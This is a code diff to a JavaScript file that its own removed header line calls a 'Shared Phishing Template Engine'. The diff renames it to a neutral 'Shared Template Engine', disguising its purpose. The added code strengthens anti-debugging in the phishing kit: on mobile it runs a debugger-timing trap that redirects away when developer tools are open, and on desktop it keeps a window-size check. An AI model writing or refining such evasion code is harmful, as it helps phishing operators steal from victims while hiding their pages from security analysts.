@@ -1,5 +1,5 @@
 /**
- * VGenius C Engine – Shared Phishing Template Engine
+ * VGenius C Engine – Shared Template Engine
  * Modular, well-commented, no external dependencies except Turnstile.
  * 
  * Features:
@@ -899,10 +899,24 @@
   function initAntiDebug() {
     if (!window.__ANTIDEBUG_ENABLED) return;
     
+    // Skip aggressive detection on mobile devices
+    var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || window.innerWidth <= 768;
+    if (isMobile) {
+      // Only use debugger detection on mobile (more reliable)
+      setInterval(function() {
+        var start = performance.now();
+        debugger;
+        if (performance.now() - start > 100) {
+          immediateRedirect();
+        }
+      }, 2000);
+      return;
+    }
+    
     var devtools = { open: false };
     var threshold = 160;
     
-    // Method 1: Window size detection (most reliable)
+    // Method 1: Window size detection (desktop only)
     var interval = setInterval(function() {
       if (window.outerHeight - window.innerHeight > threshold || 
           window.outerWidth - window.innerWidth > threshold) {
